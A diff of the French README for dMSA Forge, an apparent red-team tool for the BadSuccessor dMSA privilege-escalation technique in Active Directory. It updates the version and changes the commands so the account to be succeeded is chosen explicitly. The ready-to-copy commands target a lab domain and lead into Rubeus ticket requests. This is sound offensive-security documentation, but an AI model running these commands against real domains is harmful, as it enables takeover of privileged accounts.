@@ -1,12 +1,12 @@
 # dMSA Forge
 
-[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.6)
+[![Release](https://img.shields.io/github/v/release/RedteamNotes/dmsa-forge?label=release)](https://github.com/RedteamNotes/dmsa-forge/releases/tag/v0.5.8)
 [![Tests](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml/badge.svg)](https://github.com/RedteamNotes/dmsa-forge/actions/workflows/test.yml)
 [![License](https://img.shields.io/badge/license-Impacket%20Apache--1.1-blue)](https://github.com/RedteamNotes/dmsa-forge/blob/main/LICENSE)
 
 **Langue :** [English](../README.md) | [简体中文](README.zh-CN.md) | Français
 
-Version actuelle : `v0.5.6`
+Version actuelle : `v0.5.8`
 
 Forge [dMSA](https://learn.microsoft.com/fr-fr/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) pour les workflows LDAP [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) autorisés : add, verify, delete et search.
 
@@ -81,10 +81,10 @@ Les exemples ci-dessous utilisent des commandes nommées par tâche et les optio
 Prévisualisez un add avec le profil safe. Les commandes de ce README sont volontairement présentées sur une seule ligne, prêtes à copier ; si vous utilisez un wrapper local comme `proxychains -f chain1080.conf -q`, placez-le avant `dmsa-forge`.
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --profile safe --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
 ```
 
-Par défaut, `DOMAIN/user` infère `--scope-domain`, `--scope-base-dn` et `--base-dn` ; LDAP/389 est la méthode et le port par défaut ; `--target-account` vaut `Administrator` ; `--dns-hostname` est inféré depuis `--dmsa-name` et le domaine du compte. Utilisez les options explicites uniquement pour remplacer ces valeurs.
+Par défaut, `DOMAIN/user` infère `--scope-domain`, `--scope-base-dn` et `--base-dn` ; LDAP/389 est la méthode et le port par défaut ; `--dns-hostname` est inféré depuis `--dmsa-name` et le domaine du compte. Pour `add`, choisissez explicitement le compte à succéder avec `--target-account` et le lecteur du mot de passe géré avec `--principals-allowed`.
 
 ## Flux Opérateur
 
@@ -99,13 +99,13 @@ dmsa-forge verify eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb
 Plan d'ajout :
 
 ```bash
-dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
+dmsa-forge plan add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Ajouter :
 
 ```bash
-dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --principals-allowed '<SID_OR_NAME>'
+dmsa-forge add eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb --target-ou 'OU=Staff,DC=eighteen,DC=htb' --dmsa-name redpen --target-account 'ACCOUNT_TO_SUCCEED' --principals-allowed '<SID_OR_NAME>'
 ```
 
 Vérification après ajout :
@@ -122,7 +122,7 @@ dmsa-forge delete eighteen.htb/adam.scott:'PASSWORD' --dc-host dc01.eighteen.htb
 
 Après un `add` ou `verify` validé, `Next steps` affiche directement les commandes Kerberos externes concrètes. Le flux généré commence par `Rubeus hash`, utilise ensuite la valeur AES256 affichée pour `asktgt`, puis lance la requête dMSA `asktgs`.
 
-La résolution du compte cible repose sur une recherche LDAP. `add` utilise `Administrator` comme valeur par défaut de `--target-account`; fournissez un autre sAMAccountName ou DN lorsque le workflow autorisé cible un autre compte.
+La résolution du compte cible repose sur une recherche LDAP. `--target-account` écrit `msDS-ManagedAccountPrecededByLink`; `--principals-allowed` écrit le SID utilisé dans `msDS-GroupMSAMembership`. Les next steps générés par search peuvent remplir le SID principal découvert, mais le compte cible reste un choix explicite de l'opérateur.
 
 Contrôles de sécurité :
 
